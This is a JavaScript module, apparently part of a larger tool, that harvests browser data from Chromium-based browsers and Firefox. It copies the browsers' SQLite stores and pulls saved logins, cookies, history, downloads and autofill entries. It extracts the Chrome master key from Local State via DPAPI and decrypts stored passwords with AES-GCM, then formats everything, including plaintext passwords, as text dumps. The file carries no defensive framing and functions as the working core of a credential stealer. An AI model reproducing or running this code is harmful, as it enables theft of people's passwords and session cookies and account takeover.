/**
 * Browser Data Decryption Module
 * Handles decryption and parsing of browser data files
 */

const fs = require('fs');
const path = require('path');
const Database = require('better-sqlite3');
const { logger } = require('../../core/logger');
const { ErrorHandler, ModuleError } = require('../../core/errors');

// Try to load DPAPI module - will only work on Windows
let Dpapi = null;
let isPlatformSupported = false;
try {
    const dpapiModule = require('@primno/dpapi');
    Dpapi = dpapiModule.Dpapi;
    isPlatformSupported = dpapiModule.isPlatformSupported;
} catch (error) {
    logger.debug('DPAPI module not available (running on non-Windows system?)');
}

class BrowserDecryptor {
    constructor() {
        this.isWindows = process.platform === 'win32';
        this.masterKey = null;
    }

    /**
     * Decrypt and parse browser data file
     * @param {string} filePath - Path to the browser data file
     * @param {string} dataType - Type of data (passwords, cookies, history, etc.)
     * @param {string} browserType - Browser type (chrome, firefox, edge, etc.)
     * @param {string} profilePath - Profile path for master key lookup
     * @returns {Promise<Array>} Parsed data array
     */
    async decryptAndParse(filePath, dataType, browserType, profilePath = null) {
        try {
            if (!fs.existsSync(filePath)) {
                logger.debug(`Data file does not exist: ${filePath}`);
                return [];
            }

            // Check file size
            const stats = fs.statSync(filePath);
            if (stats.size === 0) {
                logger.debug(`Data file is empty: ${filePath}`);
                return [];
            }

            // Get master key for Chrome v80+ if needed
            if (dataType === 'passwords' && browserType !== 'firefox' && profilePath) {
                logger.debug(`Attempting to get master key for ${browserType} from ${profilePath}`);
                this.masterKey = await this.getMasterKey(profilePath);
                if (this.masterKey) {
                    logger.debug(`Master key obtained for ${browserType} (${this.masterKey.length} bytes)`);
                } else {
                    logger.debug(`No master key available for ${browserType}`);
                }
            }

            // Firefox uses different approach
            if (browserType === 'firefox') {
                return await this.parseFirefoxData(filePath, dataType);
            }

            // Chrome-based browsers (Chrome, Edge, Brave, Opera)
            return await this.parseChromeBasedData(filePath, dataType, browserType);

        } catch (error) {
            logger.error(`Failed to decrypt/parse ${dataType} from ${filePath}`, error.message);
            return [];
        }
    }

    /**
     * Parse Chrome-based browser data
     * @param {string} filePath - Path to the database file
     * @param {string} dataType - Type of data
     * @param {string} browserType - Browser type
     * @returns {Promise<Array>} Parsed data
     */
    async parseChromeBasedData(filePath, dataType, browserType) {
        // Handle bookmarks (JSON file)
        if (dataType === 'bookmarks' && filePath.toLowerCase().includes('bookmarks')) {
            return await this.parseBookmarksFile(filePath);
        }

        // Copy file to temp location for reading (browsers may have it locked)
        const tempFile = filePath + '.temp';
        try {
            fs.copyFileSync(filePath, tempFile);
        } catch (error) {
            logger.debug(`Could not copy database file: ${error.message}`);
            return [];
        }

        try {
            const db = new Database(tempFile, { readonly: true, fileMustExist: true });
            const data = this.queryDatabase(db, dataType, browserType);
            db.close();
            
            // Clean up temp file
            try {
                fs.unlinkSync(tempFile);
            } catch (e) {}
            
            return data;
        } catch (error) {
            logger.debug(`Could not open database: ${error.message}`);
            // Clean up temp file
            try {
                fs.unlinkSync(tempFile);
            } catch (e) {}
            return [];
        }
    }

    /**
     * Query SQLite database for specific data type
     * @param {Object} db - SQLite database connection
     * @param {string} dataType - Type of data to query
     * @param {string} browserType - Browser type
     * @returns {Array} Query results
     */
    queryDatabase(db, dataType, browserType) {
        let query = '';
        let processor = null;

        switch (dataType) {
            case 'passwords':
                query = `SELECT origin_url, username_value, password_value, date_created 
                        FROM logins 
                        WHERE blacklisted_by_user = 0 
                        ORDER BY date_created DESC`;
                processor = this.processPasswordRow.bind(this);
                break;

            case 'cookies':
                query = `SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc 
                        FROM cookies 
                        ORDER BY creation_utc DESC 
                        LIMIT 1000`;
                processor = this.processCookieRow.bind(this);
                break;

            case 'history':
                query = `SELECT url, title, visit_count, last_visit_time 
                        FROM urls 
                        WHERE visit_count > 0 
                        ORDER BY last_visit_time DESC 
                        LIMIT 1000`;
                processor = this.processHistoryRow.bind(this);
                break;

            case 'downloads':
                query = `SELECT target_path, referrer, total_bytes, start_time, end_time, state 
                        FROM downloads 
                        ORDER BY start_time DESC 
                        LIMIT 500`;
                processor = this.processDownloadRow.bind(this);
                break;

            case 'autofill':
                query = `SELECT name, value, count, date_created 
                        FROM autofill 
                        ORDER BY count DESC, date_created DESC 
                        LIMIT 500`;
                processor = this.processAutofillRow.bind(this);
                break;

            default:
                return [];
        }

        try {
            const stmt = db.prepare(query);
            const rows = stmt.all();
            const results = [];

            for (const row of rows) {
                try {
                    const processedRow = processor ? processor(row, browserType) : row;
                    if (processedRow) {
                        results.push(processedRow);
                    }
                } catch (error) {
                    logger.debug(`Row processing error: ${error.message}`);
                }
            }

            return results;
        } catch (error) {
            logger.debug(`Query error: ${error.message}`);
            return [];
        }
    }

    /**
     * Process password row and decrypt password with enhanced error recovery
     * @param {Object} row - Database row
     * @param {string} browserType - Browser type
     * @returns {Object} Processed password data
     */
    processPasswordRow(row, browserType) {
        try {
            let password = '';
            
            if (row.password_value && row.password_value.length > 0) {
                if (this.isWindows && Dpapi && isPlatformSupported) {
                    try {
                        const encryptedPassword = Buffer.from(row.password_value);
                        logger.debug(`Processing password for ${browserType}, encrypted length: ${encryptedPassword.length} bytes`);
                        
                        // Check if it's Chrome v80+ format (starts with "v10" or "v11")
                        if (encryptedPassword.length > 3 && 
                            (encryptedPassword.toString('utf8', 0, 3) === 'v10' || 
                             encryptedPassword.toString('utf8', 0, 3) === 'v11')) {
                            
                            // Try to decrypt with master key
                            if (this.masterKey) {
                                logger.debug(`Attempting Chrome v80+ decryption for ${browserType}`);
                                password = this.decryptChromeV80Password(encryptedPassword, this.masterKey);
                                
                                // Check if decryption actually worked (not an error message)
                                if (password.startsWith('[') && password.endsWith(']')) {
                                    logger.debug(`Chrome v80+ decryption failed with message: ${password}`);
                                } else {
                                    logger.debug(`Chrome v80+ decryption successful for ${browserType}`);
                                }
                            } else {
                                password = '[Encrypted - Chrome v80+ - Master Key Not Available]';
                                logger.debug(`Master key not available for ${browserType} v80+ decryption`);
                            }
                        } else {
                            // Try DPAPI decryption for older versions
                            try {
                                logger.debug(`Attempting DPAPI decryption for ${browserType}`);
                                // Use the enhanced DPAPI decryption method
                                password = this.tryDpapiDecryption(encryptedPassword, browserType);
                                logger.debug(`DPAPI decryption successful for ${browserType}`);
                            } catch (dpapiError) {
                                password = '[DPAPI Decryption Failed]';
                                logger.debug(`DPAPI decryption failed for ${browserType}:`, dpapiError.message);
                            }
                        }
                    } catch (error) {
                        password = '[Decryption Failed]';
                        logger.debug(`General decryption error for ${browserType}:`, error.message);
                    }
                } else if (!this.isWindows) {
                    password = '[Encrypted - Non-Windows System]';
                    logger.debug('Non-Windows system detected, DPAPI not available');
                } else {
                    password = '[DPAPI Module Not Available]';
                    logger.debug('DPAPI module not available');
                }
            } else {
                password = '[No Password Data]';
                logger.debug('No password data found in database row');
            }

            const result = {
                url: row.origin_url || '',
                username: row.username_value || '',
                password: password,
                dateCreated: this.formatTimestamp(row.date_created)
            };
            
            logger.debug(`Processed password entry for ${result.url} - Username: ${result.username}, Password status: ${password.startsWith('[') ? 'encrypted/failed' : 'decrypted'}`);
            return result;
        } catch (error) {
            logger.debug(`Password processing error: ${error.message}`);
            return {
                url: row.origin_url || '',
                username: row.username_value || '',
                password: '[Processing Error]',
                dateCreated: this.formatTimestamp(row.date_created)
            };
        }
    }

    /**
     * Process cookie row
     * @param {Object} row - Database row
     * @returns {Object} Processed cookie data
     */
    processCookieRow(row) {
        try {
            return {
                host: row.host_key || '',
                name: row.name || '',
                value: row.value || '',
                path: row.path || '',
                secure: row.is_secure === 1,
                httpOnly: row.is_httponly === 1,
                expires: this.formatTimestamp(row.expires_utc),
                created: this.formatTimestamp(row.creation_utc)
            };
        } catch (error) {
            logger.debug(`Cookie processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process history row
     * @param {Object} row - Database row
     * @returns {Object} Processed history data
     */
    processHistoryRow(row) {
        try {
            return {
                url: row.url || '',
                title: row.title || '',
                visitCount: row.visit_count || 0,
                lastVisit: this.formatTimestamp(row.last_visit_time)
            };
        } catch (error) {
            logger.debug(`History processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process download row
     * @param {Object} row - Database row
     * @returns {Object} Processed download data
     */
    processDownloadRow(row) {
        try {
            return {
                path: row.target_path || '',
                referrer: row.referrer || '',
                size: row.total_bytes || 0,
                startTime: this.formatTimestamp(row.start_time),
                endTime: this.formatTimestamp(row.end_time),
                state: row.state || 0
            };
        } catch (error) {
            logger.debug(`Download processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process autofill row
     * @param {Object} row - Database row
     * @returns {Object} Processed autofill data
     */
    processAutofillRow(row) {
        try {
            return {
                name: row.name || '',
                value: row.value || '',
                count: row.count || 0,
                dateCreated: this.formatTimestamp(row.date_created)
            };
        } catch (error) {
            logger.debug(`Autofill processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Get Chrome master key from Local State file with improved path detection
     * @param {string} profilePath - Browser profile path
     * @returns {Promise<Buffer|null>} Master key or null
     */
    async getMasterKey(profilePath) {
        try {
            // Enhanced path detection for Local State file
            const possiblePaths = this.getLocalStatePaths(profilePath);
            
            let localStatePath = null;
            for (const testPath of possiblePaths) {
                logger.debug(`Testing Local State path: ${testPath}`);
                if (fs.existsSync(testPath)) {
                    localStatePath = testPath;
                    logger.debug(`Found Local State at: ${localStatePath}`);
                    break;
                }
            }
            
            if (!localStatePath) {
                logger.debug('Local State file not found at any expected location');
                logger.debug(`Searched paths: ${possiblePaths.join(', ')}`);
                return null;
            }

            return await this.extractMasterKeyFromLocalState(localStatePath);
        } catch (error) {
            logger.debug('Master key extraction failed:', error.message);
            return null;
        }
    }

    /**
     * Get all possible Local State file paths
     * @param {string} profilePath - Browser profile path
     * @returns {Array<string>} Array of possible paths
     */
    getLocalStatePaths(profilePath) {
        const possiblePaths = [];
        
        // Standard location: go up to parent directory
        const userDataPath = path.dirname(profilePath);
        possiblePaths.push(path.join(userDataPath, 'Local State'));
        
        // Alternative: sometimes the profilePath is already the User Data folder
        possiblePaths.push(path.join(profilePath, 'Local State'));
        
        // Alternative: go up two levels if profilePath is deep
        const grandParentPath = path.dirname(userDataPath);
        possiblePaths.push(path.join(grandParentPath, 'Local State'));
        
        // Try common browser locations if profile path doesn't work
        const localAppData = process.env.LOCALAPPDATA || '';
        if (localAppData) {
            possiblePaths.push(path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Local State'));
            possiblePaths.push(path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Local State'));
            possiblePaths.push(path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'));
        }
        
        // Remove duplicates
        return [...new Set(possiblePaths)];
    }

    /**
     * Extract master key from Local State file content
     * @param {string} localStatePath - Path to Local State file
     * @returns {Promise<Buffer|null>} Master key or null
     */
    async extractMasterKeyFromLocalState(localStatePath) {
        try {
            const localStateData = fs.readFileSync(localStatePath, 'utf8');
            const localState = JSON.parse(localStateData);
            
            if (!localState.os_crypt || !localState.os_crypt.encrypted_key) {
                logger.debug('No encrypted key found in Local State - os_crypt structure missing');
                return null;
            }

            logger.debug('Found encrypted key in Local State');

            // Decode the base64 encrypted key
            const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
            
            // Remove DPAPI prefix "DPAPI"
            if (encryptedKey.length < 5 || encryptedKey.subarray(0, 5).toString() !== 'DPAPI') {
                logger.debug(`Invalid encrypted key format - expected DPAPI prefix, got: ${encryptedKey.subarray(0, 5).toString()}`);
                return null;
            }

            const keyWithoutPrefix = encryptedKey.subarray(5);
            logger.debug(`Attempting to decrypt master key with DPAPI (${keyWithoutPrefix.length} bytes)`);
            
            if (this.isWindows && Dpapi && isPlatformSupported) {
                // Use the enhanced DPAPI decryption method
                try {
                    const decryptedKey = this.tryDpapiDecryption(keyWithoutPrefix, 'MasterKey', true);
                    logger.debug(`Successfully decrypted master key (${decryptedKey.length} bytes)`);
                    return decryptedKey;
                } catch (error) {
                    logger.debug('Failed to decrypt master key with enhanced DPAPI:', error.message);
                    return null;
                }
            } else {
                logger.debug('DPAPI not available for master key decryption (not Windows or module missing)');
                return null;
            }
        } catch (error) {
            logger.debug('Master key extraction from Local State failed:', error.message);
            return null;
        }
    }

    /**
     * Try DPAPI decryption with multiple methods and contexts
     * @param {Buffer} encryptedData - Encrypted data buffer  
     * @param {string} description - Description for logging
     * @param {boolean} returnBuffer - Whether to return Buffer instead of string
     * @returns {string|Buffer} Decrypted data
     */
    tryDpapiDecryption(encryptedData, description, returnBuffer = false) {
        if (!Dpapi || !isPlatformSupported) {
            throw new Error('DPAPI module not available');
        }

        const methods = [
            { context: 'CurrentUser', description: 'Current User context' },
            { context: 'LocalMachine', description: 'Local Machine context' },
            { context: null, description: 'Default context' }
        ];

        let lastError = null;

        for (const method of methods) {
            try {
                logger.debug(`Trying DPAPI decryption with ${method.description} for ${description}`);
                const decrypted = Dpapi.unprotectData(encryptedData, null, method.context);
                
                if (returnBuffer) {
                    logger.debug(`DPAPI decryption successful with ${method.description} (${decrypted.length} bytes)`);
                    return decrypted;
                } else {
                    const result = decrypted.toString('utf8');
                    // Validate the result - it should be readable text
                    if (result && result.length > 0 && !result.includes('\x00')) {
                        logger.debug(`DPAPI decryption successful with ${method.description}`);
                        return result;
                    }
                }
            } catch (error) {
                logger.debug(`DPAPI decryption failed with ${method.description}:`, error.message);
                lastError = error;
                continue;
            }
        }

        // If all methods failed, try with different flags
        try {
            logger.debug('Trying DPAPI with CryptUnprotectData flags');
            const decrypted = Dpapi.unprotectData(encryptedData, null, 'CurrentUser');
            
            if (returnBuffer) {
                return decrypted;
            } else {
                return decrypted.toString('utf8');
            }
        } catch (error) {
            logger.debug('DPAPI with flags also failed:', error.message);
        }

        throw lastError || new Error('All DPAPI decryption methods failed');
    }

    /**
     * Get decryption capabilities and status
     * @returns {Object} Decryption capabilities info
     */
    getDecryptionCapabilities() {
        const capabilities = {
            platform: process.platform,
            isWindows: this.isWindows,
            dpapiAvailable: false,
            chromeV80Support: false,
            firefoxNssSupport: false,
            supportedBrowsers: []
        };

        // Check DPAPI availability
        try {
            const dpapiModule = require('@primno/dpapi');
            capabilities.dpapiAvailable = dpapiModule.isPlatformSupported;
            capabilities.chromeV80Support = dpapiModule.isPlatformSupported;
            capabilities.supportedBrowsers.push('Chrome (all versions)', 'Edge (all versions)', 'Brave', 'Opera');
        } catch (error) {
            capabilities.dpapiAvailable = false;
            capabilities.supportedBrowsers.push('Chrome (limited)', 'Edge (limited)');
        }

        // Firefox NSS support (basic implementation available)
        capabilities.firefoxNssSupport = true;
        capabilities.supportedBrowsers.push('Firefox (basic NSS support)');

        return capabilities;
    }

    /**
     * Log decryption capabilities for debugging
     */
    logDecryptionCapabilities() {
        const caps = this.getDecryptionCapabilities();
        logger.info('Browser Decryption Capabilities:', {
            platform: caps.platform,
            dpapiAvailable: caps.dpapiAvailable,
            chromeV80Support: caps.chromeV80Support,
            firefoxNssSupport: caps.firefoxNssSupport,
            supportedBrowsers: caps.supportedBrowsers
        });
    }

    async parseBookmarksFile(filePath) {
        try {
            const data = fs.readFileSync(filePath, 'utf8');
            const bookmarks = JSON.parse(data);
            
            const results = [];
            
            // Recursively parse bookmark folders
            const parseBookmarkFolder = (folder, folderPath = '') => {
                if (folder.children) {
                    for (const child of folder.children) {
                        if (child.type === 'url') {
                            results.push({
                                name: child.name || '',
                                url: child.url || '',
                                folder: folderPath,
                                dateAdded: this.formatTimestamp(child.date_added)
                            });
                        } else if (child.type === 'folder') {
                            const newPath = folderPath ? `${folderPath}/${child.name}` : child.name;
                            parseBookmarkFolder(child, newPath);
                        }
                    }
                }
            };

            // Parse root bookmark folders
            if (bookmarks.roots) {
                if (bookmarks.roots.bookmark_bar) {
                    parseBookmarkFolder(bookmarks.roots.bookmark_bar, 'Bookmarks Bar');
                }
                if (bookmarks.roots.other) {
                    parseBookmarkFolder(bookmarks.roots.other, 'Other Bookmarks');
                }
                if (bookmarks.roots.synced) {
                    parseBookmarkFolder(bookmarks.roots.synced, 'Mobile Bookmarks');
                }
            }

            return results;
        } catch (error) {
            logger.debug(`Bookmarks parsing error: ${error.message}`);
            return [];
        }
    }
    /**
     * Parse Firefox data with improved NSS decryption support
     * @param {string} filePath - Path to Firefox data file
     * @param {string} dataType - Type of data
     * @returns {Promise<Array>} Parsed data
     */
    async parseFirefoxData(filePath, dataType) {
        try {
            if (dataType === 'passwords' && filePath.endsWith('logins.json')) {
                // Firefox stores passwords in JSON format
                const data = fs.readFileSync(filePath, 'utf8');
                const loginData = JSON.parse(data);
                
                // Get the profile directory for key files
                const profileDir = path.dirname(filePath);
                
                return (loginData.logins || []).map(login => {
                    let username = '[Encrypted - Firefox NSS]';
                    let password = '[Encrypted - Firefox NSS]';
                    
                    // Try to decrypt if possible
                    if (login.encryptedUsername) {
                        const decryptedUsername = this.tryFirefoxDecryption(login.encryptedUsername, profileDir);
                        username = decryptedUsername || '[Encrypted - Firefox NSS]';
                    }
                    
                    if (login.encryptedPassword) {
                        const decryptedPassword = this.tryFirefoxDecryption(login.encryptedPassword, profileDir);
                        password = decryptedPassword || '[Encrypted - Firefox NSS]';
                    }
                    
                    return {
                        url: login.hostname || '',
                        username: username,
                        password: password,
                        dateCreated: this.formatTimestamp(login.timeCreated)
                    };
                });
            }

            // For SQLite files in Firefox
            if (filePath.endsWith('.sqlite')) {
                return await this.parseChromeBasedData(filePath, dataType, 'firefox');
            }

            return [];
        } catch (error) {
            logger.debug(`Firefox data parsing error: ${error.message}`);
            return [];
        }
    }

    /**
     * Try to decrypt Firefox NSS encrypted data
     * @param {string} encryptedData - Base64 encrypted data
     * @param {string} profileDir - Firefox profile directory
     * @returns {string|null} Decrypted data or null if failed
     */
    tryFirefoxDecryption(encryptedData, profileDir) {
        try {
            // Check if data looks encrypted (base64 with padding)
            if (!encryptedData || typeof encryptedData !== 'string') {
                return null;
            }
            
            // If it's short and doesn't look encrypted, it might be plaintext
            if (encryptedData.length < 50 && !encryptedData.includes('=')) {
                return encryptedData;
            }
            
            // Check for common Firefox NSS encryption markers
            if (!encryptedData.includes('=') && encryptedData.length < 100) {
                return encryptedData; // Might be plaintext
            }
            
            // Try to check if Firefox has a master password set
            const key4Path = path.join(profileDir, 'key4.db');
            const cert9Path = path.join(profileDir, 'cert9.db');
            
            if (!fs.existsSync(key4Path)) {
                logger.debug('Firefox key4.db not found, cannot decrypt NSS data');
                return null;
            }
            
            // Basic attempt to decode base64 and check if it's meaningful
            try {
                const decoded = Buffer.from(encryptedData, 'base64');
                
                // If decode works and result is reasonable length, try to detect if it has encryption markers
                if (decoded.length > 0 && decoded.length < 1000) {
                    // Check for common patterns that might indicate unencrypted data
                    const decodedStr = decoded.toString('utf8');
                    
                    // If it contains readable characters and no null bytes, it might be plaintext
                    if (decodedStr.match(/^[a-zA-Z0-9@._-]+$/) && !decodedStr.includes('\x00')) {
                        logger.debug('Firefox data appears to be plaintext after base64 decode');
                        return decodedStr;
                    }
                }
            } catch (decodeError) {
                // Not valid base64, might be plaintext
                return encryptedData;
            }
            
            // For now, return null since we can't decrypt NSS without proper libraries
            logger.debug('Firefox NSS decryption requires specialized libraries (not implemented)');
            return null;
            
        } catch (error) {
            logger.debug(`Firefox decryption attempt failed: ${error.message}`);
            return null;
        }
    }

    /**
     * Decrypt Chrome v80+ password using AES-GCM with enhanced error handling
     * @param {Buffer} encryptedPassword - Encrypted password buffer
     * @param {Buffer} masterKey - Master key for decryption
     * @returns {string} Decrypted password or error message
     */
    decryptChromeV80Password(encryptedPassword, masterKey) {
        try {
            const crypto = require('crypto');
            
            // Validate inputs
            if (!encryptedPassword || !masterKey) {
                logger.debug('Invalid inputs to Chrome v80+ decryption');
                return '[Invalid Decryption Parameters]';
            }
            
            // Chrome v80+ format: "v10" or "v11" + 12-byte nonce + encrypted data + 16-byte auth tag
            if (encryptedPassword.length < 31) { // 3 + 12 + 1 + 16 = minimum length
                logger.debug(`Chrome v80+ password too short: ${encryptedPassword.length} bytes`);
                return '[Invalid Encrypted Data Length]';
            }

            const version = encryptedPassword.subarray(0, 3).toString();
            
            // Support both v10 and v11 formats
            if (version !== 'v10' && version !== 'v11') {
                logger.debug(`Unsupported Chrome version format: ${version}`);
                return '[Unsupported Chrome Version Format]';
            }
            
            const nonce = encryptedPassword.subarray(3, 15);
            const ciphertext = encryptedPassword.subarray(15, -16);
            const authTag = encryptedPassword.subarray(-16);
            
            logger.debug(`Chrome v80+ decryption: version=${version}, nonce=${nonce.length}bytes, ciphertext=${ciphertext.length}bytes, authTag=${authTag.length}bytes`);

            // Validate master key length (should be 32 bytes for AES-256)
            if (masterKey.length !== 32) {
                logger.debug(`Invalid master key length: ${masterKey.length} bytes (expected 32)`);
                return '[Invalid Master Key Length]';
            }

            // Validate component lengths
            if (nonce.length !== 12) {
                logger.debug(`Invalid nonce length: ${nonce.length} bytes (expected 12)`);
                return '[Invalid Nonce Length]';
            }
            
            if (authTag.length !== 16) {
                logger.debug(`Invalid auth tag length: ${authTag.length} bytes (expected 16)`);
                return '[Invalid Auth Tag Length]';
            }

            // Create decipher with error handling
            let decipher;
            try {
                decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, nonce);
                decipher.setAuthTag(authTag);
            } catch (error) {
                logger.debug(`Failed to create decipher: ${error.message}`);
                return '[Failed to Initialize Decryption]';
            }

            // Decrypt with enhanced error handling
            try {
                let decrypted = decipher.update(ciphertext);
                decipher.final(); // This will throw if authentication fails
                
                const result = decrypted.toString('utf8');
                
                // Validate the result
                if (!result || result.length === 0) {
                    logger.debug('Chrome v80+ decryption produced empty result');
                    return '[Empty Decryption Result]';
                }
                
                // Check for null bytes or invalid characters
                if (result.includes('\x00')) {
                    logger.debug('Chrome v80+ decryption result contains null bytes');
                    return '[Invalid Decryption Result]';
                }
                
                logger.debug(`Chrome v80+ decryption successful, result length: ${result.length}`);
                return result;
            } catch (error) {
                logger.debug(`Chrome v80+ decryption failed during processing: ${error.message}`);
                if (error.message.includes('auth') || error.message.includes('tag')) {
                    return '[Chrome v80+ Authentication Failed - Wrong Master Key]';
                }
                return '[Chrome v80+ Decryption Processing Failed]';
            }
        } catch (error) {
            logger.debug(`Chrome v80+ decryption failed with unexpected error: ${error.message}`);
            return '[Chrome v80+ Decryption Unexpected Error]';
        }
    }
    formatTimestamp(timestamp) {
        try {
            if (!timestamp || timestamp === 0) {
                return 'Unknown';
            }

            // Chrome timestamps are microseconds since January 1, 1601 UTC
            const epochDiff = 11644473600000000; // Microseconds between 1601 and 1970
            const jsTimestamp = (timestamp - epochDiff) / 1000; // Convert to milliseconds
            
            const date = new Date(jsTimestamp);
            return date.toISOString().replace('T', ' ').replace('Z', '');
        } catch (error) {
            return 'Invalid Date';
        }
    }

    /**
     * Convert data array to formatted text
     * @param {Array} data - Parsed data array
     * @param {string} dataType - Type of data
     * @returns {string} Formatted text content
     */
    formatDataAsText(data, dataType) {
        if (!data || data.length === 0) {
            return `No ${dataType} found.\n`;
        }

        let text = `=== ${dataType.toUpperCase()} (${data.length} entries) ===\n\n`;

        switch (dataType) {
            case 'passwords':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.url}\n`;
                    text += `Username: ${item.username}\n`;
                    text += `Password: ${item.password}\n`;
                    text += `Date Created: ${item.dateCreated}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'cookies':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.host}\n`;
                    text += `Name: ${item.name}\n`;
                    text += `Value: ${item.value}\n`;
                    text += `Path: ${item.path}\n`;
                    text += `Secure: ${item.secure}\n`;
                    text += `HttpOnly: ${item.httpOnly}\n`;
                    text += `Expires: ${item.expires}\n`;
                    text += `Created: ${item.created}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'history':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.title}\n`;
                    text += `URL: ${item.url}\n`;
                    text += `Visit Count: ${item.visitCount}\n`;
                    text += `Last Visit: ${item.lastVisit}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'downloads':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${path.basename(item.path)}\n`;
                    text += `Full Path: ${item.path}\n`;
                    text += `Referrer: ${item.referrer}\n`;
                    text += `Size: ${item.size} bytes\n`;
                    text += `Start Time: ${item.startTime}\n`;
                    text += `End Time: ${item.endTime}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'autofill':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.name}\n`;
                    text += `Value: ${item.value}\n`;
                    text += `Count: ${item.count}\n`;
                    text += `Date Created: ${item.dateCreated}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'bookmarks':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.name}\n`;
                    text += `URL: ${item.url}\n`;
                    text += `Folder: ${item.folder}\n`;
                    text += `Date Added: ${item.dateAdded}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            default:
                text += JSON.stringify(data, null, 2);
        }

        return text;
    }
}

module.exports = {
    BrowserDecryptor
};